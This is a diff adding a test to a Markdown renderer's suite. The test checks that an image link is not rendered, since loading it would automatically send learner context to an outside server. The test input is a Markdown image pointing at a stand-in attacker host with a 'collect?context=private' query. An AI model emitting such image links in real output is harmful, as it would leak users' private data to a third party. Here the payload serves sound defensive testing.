@@ -14,6 +14,14 @@ function renderMarkdown(source: string): HTMLElement {
 }
 
 describe("Markdown", () => {
+  it("does not render images that could automatically disclose learner context", () => {
+    const root = renderMarkdown(
+      "Safe passage. ![reference](https://attacker.example/collect?context=private)",
+    );
+    expect(root.querySelector("img")).toBeNull();
+    expect(root.textContent).toContain("Safe passage.");
+  });
+
   it("renders paragraphs, and separates them the way blank lines ask", () => {
     const root = renderMarkdown("First paragraph.\n\nSecond paragraph.");
 
